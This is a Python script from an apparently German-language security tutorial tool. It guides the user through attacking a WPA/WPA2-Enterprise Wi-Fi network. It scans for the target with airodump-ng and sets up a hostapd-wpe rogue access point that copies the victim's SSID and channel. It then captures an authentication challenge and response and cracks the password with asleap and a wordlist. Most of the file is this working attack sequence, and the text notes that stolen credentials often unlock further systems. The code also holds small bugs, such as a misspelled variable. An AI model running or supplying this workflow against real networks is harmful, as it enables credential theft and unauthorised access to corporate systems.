#!/usr/bin/python
# -*- coding: utf-8 -*-
import os
import sys
import subprocess
import time
import subprocess

import colors
import generics
from generics import rlinput,execute,clearScreen,deauthClients


def Enterprise_Menu():
	attack = True
	while(attack==True):
		clearScreen()
		shellCols = colors.ShellColors
		print shellCols.UNDERLINE + shellCols.HEADER + 'Untermenü: WPA/WPA2-Enterprise Passwort knacken' + shellCols.ENDC +'\n'
		print("Neben klassischen PSK-gesicherten Netzen findet man vor allem im Firmenumfeld oft, durch einen Benutzermanagementsserver verwaltete, Enterprise-gesicherte WLAN-Netze. "
			+"Bei der Enterprise-Verschlüsselung wird zur erfolgreichen Authentifikation ein Paar aus Nutzername und dazugehörigem Passwort. Das Authentifikationsanfrage wird vom Router an einen Radiusserver weitergeleitet. "
			+"Diese Art der Absicherung von WLAN-Netzen kann für einen Angreifer besonders lukrativ sein, da das für die Authentifikation genutzten "
			+"Paar oftmals auch noch Zugang zu weiteren Systemen gewährt. Somit kann erstmal nicht nur ein nicht autorisierter Zugang zu einem WLAN-Netz "
			+"erfolgen, sondern nachfolgend noch weitere Systeme kompromittiert werden. \n")
		print('Um dieses Tutorial durchzuführen müssen zuerst folgende Parameter vorgegeben werden: '
			+'\n 1. Name des WLAN-Interfaces '
			+'\n 2. Die SSID, Kanalnummer und Verschlüsselung des angegriffenen Routers/Netzwerks\n')
		
		#STEP 1
		command = rlinput('WLAN-Interfacename ermitteln mittels: \n# ', 'ifconfig')
		execute(command)
		wifi_name = raw_input("Name des WLAN-Interfaces hier angeben: ")

		#KILL PROCESSES
		generics.kill_wifi_proc()
		
		#STEP 2
		command = rlinput('Die SSID und Kanalnummer ermitteln (Netzwerk anhand der SSID indentifzieren): \n# ', 'airodump-ng ' +wifi_name )
		execute(command)
		router_ssid = raw_input("Bitte die Router SSID angeben: ")
		router_chn = raw_input("Bitte die Netzwerk Kanalnummer angeben: ")

		print ('Verschlüsselung des Netzes: '
			+'\n 1. WPA '
			+'\n 2. WPA2 \n')
		try:
			selection = input("Die Verschlüsselung bitte hier eingeben und mit Enter bestätigen: ")
		except SyntaxError:
			selection=1
		if((selection != 1) and (selection != 2)):
			print("Die ausgewählte Verschlüsselung existiert nicht. Bitte eine Auswahl zwischen 1 und 2 angeben.")
			selection = raw_input("Die Verschlüsselung bitte hier eingeben und mit Enter bestätigen: ")

		if((selection != 1) and (selection != 2)):
			print('Mehrere falsche Eingaben wurden erkannt. Zum Fortfahren wurde automatisch Verschlüsselung 1 gewählt!')
			selection=1

		wpa_mode = selection
		
		#STRIP STRINGS
		wifi_name = wifi_name.strip()
		router_ssid = router_ssid.strip()
		router_chn = router_chn.strip()

		#OVERVIEW CONFIGURATION
		print("\n")
		print shellCols.UNDERLINE + shellCols.HEADER + "Folgende Konfiguration für die Druchführung der Angriffe wurde festgehalten:" + shellCols.ENDC + '\n'
		print('WLAN-Interfacename: ' + wifi_name)
		print('SSID: ' + router_ssid)
		print('Kanalnummer: ' + router_chn)
		if(wpa_mode == 1):
			print('Verschlüsselung: WPA')
		else:
			print('Verschlüsselung: WPA2')
		print("\n")
		##################################################
		## TODO Refactor fake AP Use Dispro Package
		## Only Config needed
		##

		#SWITCHING NETWORK CONFIG
		print('Anpassen der WIFI-Interfacekonfiguration des Betriebssystems.')
		command = rlinput('Zwischenspeichern der Originalkonfiguration: \n# ', 'cp /etc/network/interfaces /etc/network/interfaces_restore' )
		os.system(command)
		print("Anpassen der Interfaces-Konfiguration.")
		exist = generics.check_string("/etc/network/interfaces", "iface " + wifi_name + " inet")
		if(exist==True):
			# Check if 
			exist = generics.check_string("/etc/network/interfaces", "iface " + wifi_name + " inet manual")
			if(exit==True):
				print "Interface ist schon auf manuell gesetzt. Wurde die Anwendung vielleicht das letzte mal nicht richtig bendet?\n"
			else:
				generics.find_replace_line("/etc/network/interfaces", "iface " + wifi_name + " inet", "#iface " + wifi_name + " inet")
				generics.append("/etc/network/interfaces", "iface " + wifi_name + " inet manual")
		else:
			generics.append("/etc/network/interfaces", "iface " + wifi_name + " inet manual")
		
		#RESTART Network-Manager
		generics.restart_networkmanager()

		print shellCols.UNDERLINE + shellCols.HEADER + "Konfigurieren des Fake-Enterprise-Routers" + shellCols.ENDC + '\n'
		print("Folgende Anpassungen werden vorgenommen (hostapd-wpe.conf):")
		print ("Zeile 11: interface="+ wifi_name)
		generics.replace_line("WIFI/hostapd-wpe.conf", 10, "interface="+ wifi_name + "\n")
		print ("Zeile 14: #driver=wired")
		generics.replace_line("WIFI/hostapd-wpe.conf", 13, "#driver=wired"+ "\n")
		print ("Zeile 25: ssid="+ router_ssid)
		generics.replace_line("WIFI/hostapd-wpe.conf", 24, "ssid="+ router_ssid+ "\n")
		print ("Zeile 27: channel="+ router_chn)
		generics.replace_line("WIFI/hostapd-wpe.conf", 26, "channel="+ router_chn+ "\n")
		print ("Zeile 49: wpa="+ str(wpa_mode))
		generics.replace_line("WIFI/hostapd-wpe.conf", 48, "wpa="+ str(wpa_mode)+ "\n")
		print("\n")
		
		#START THE FAKE AP
		command = rlinput('Starten des konfigurierten Fake-Enterprise-Routers und Aufzeichnung eines Authentifikationsversuchs (Liegt ein Versuch bestehend aus Challange und Response vor kann der Prozess beendet werden): \n# ', 'WIFI/startFakeAP.sh' )
		execute(command)

		#WAIT FOR CHALLANGE RESPONSE PAIR
		print("Wurde ein Authentifikationsversuch aufgezeichnet, kann der Fake-AP heruntergefahren und die Deauthenticate-Attacke beendet werden und es können folgende Parameter ausgefüllt werden(Deise müssen aus dem Log des FAKE AP entnohmen werden):")
		challenge = raw_input("Challenge des Authentifikationsversuch: ").strip()
		response = raw_input("Response des Authentifikationsversuch: ").strip()


		#CRACK THE PWD
		command = rlinput('Knacken des Passwortes mittels eines Wörterbuchangriffs: \n# ', 'asleap -C ' + challenge + " -R " + response + " -W WIFI/dict.txt" )
		execute(command)
		#!!!! TODO !!!! is not Corekt
		#REDO INTERFACE CONFIG
		command = rlinput('Wiederherstellen der Originalkonfiguration: \n# ', 'mv /etc/network/interfaces_restore /etc/network/interfaces' )
		os.system(command)
		generics.restart_networkmanager()

		

		#END
		print('Ende des WPA/WPA2-Enterprise-Tutorials erreicht! \n Bitte wählen zum Fortfahren: \n')
		print ('1. Zurück zum Menü \n'
			+ '2. Zurück zur WPA/WPA2-Enterprise-Übersicht\n' 
			+ '0. Tutorial beenden \n')
		try:
			selection = input("Die Auswahl bitte hier eingeben und mit Enter bestätigen: ")
		except SyntaxError:
			selection=0
		if(selection==1):
			attack = False
			return True
		elif(selection==2):
			attack=True
			#Just du magic stuff. Unicorn!!
		else: 
			attack = False
			return False

def sql_signal_handler(signal, frame):
	#Check if interfaces copied
	if(os.path.isfile("/etc/network/interfaces_restore")):
		os.system("mv /etc/network/interfaces_restore /etc/network/interfaces")	
	#ReStart Networkmanager
	os.system("service networking stop && service network-manager stop")
	os.system("service networking start && service network-manager start")
	print('\n\n Die Security Workbench wird beendet ... \n')
	sys.exit(0)

	#FINISHED ENTERPRISE ATTACK
